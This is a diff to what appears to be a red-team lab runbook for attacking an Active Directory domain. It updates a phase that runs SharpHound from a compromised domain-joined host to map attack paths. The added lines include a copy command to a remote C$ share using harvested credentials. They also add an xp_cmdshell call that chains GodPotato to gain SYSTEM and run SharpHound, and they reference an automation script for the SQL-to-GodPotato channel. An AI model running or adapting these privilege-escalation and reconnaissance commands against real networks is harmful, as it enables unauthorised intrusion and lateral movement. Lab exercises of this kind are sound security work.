@@ -13,12 +13,14 @@
 ### Phase 4 — Discovery (BloodHound as analyst_cloud)
 
 
-Phase 3 gave us `analyst_cloud`'s token on mbr01 via file delivery. Now we run BloodHound from this domain-joined context to map the full attack surface.
+Phase 3.5 gave us `analyst_cloud`'s credentials (and potentially token) on mbr01. Now we run BloodHound from this domain-joined context to map the full attack surface.
+
+**Verified automation:** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` runs `SharpHound.exe` as SYSTEM on `mbr01` and pulls the zip back to `ws01`. The resulting data can be loaded into BloodHound CE for analysis.
 
 **Why from mbr01 and not Kali?** SharpHound has different collection methods:
 
 - **From Kali** (any domain user): `-c Group,ACL,Trust` — LDAP-only data (users, groups, ACLs, trusts). No session data.
-- **From domain-joined machine** (analyst_cloud): `-c All` — everything above plus local session data, local group memberships, logged-on users, GPO mappings.
+- **From domain-joined machine** (`analyst_cloud` or SYSTEM): `-c All` — everything above plus local session data, local group memberships, logged-on users, GPO mappings.
 
 Session data reveals attack paths invisible from LDAP alone (e.g., a user who's local admin on multiple machines).
 
@@ -33,10 +35,20 @@ New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools' -Force -
 Copy-Item -Path 'C:\Tools\ADTools\SharpHound.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\SharpHound.exe' -Force -Credential $cred
 ```
 
-#### Step 2 — Run SharpHound as analyst_cloud
+#### Step 2 — Run SharpHound as SYSTEM or analyst_cloud
+
+**Automation (preferred):** `attack-matrix/04-automation/linux/campaign-a/T004-mbr01-bh-ws01.sh` runs `SharpHound.exe` as SYSTEM on `mbr01` via the SQL → GodPotato channel and pulls the zip back to `ws01`.
+
+**Manual run as analyst_cloud (RDP/WinRS):**
 
 ```bash
 SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Users\analyst_cloud\Documents
+```
+
+**Manual run as SYSTEM via xp_cmdshell:**
+
+```bash
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\SharpHound.exe -c All -d child.cadre.local --outputdirectory C:\Windows\Temp\cadre-tools"';
 ```
 
 #### Step 3 — BloodHound analysis
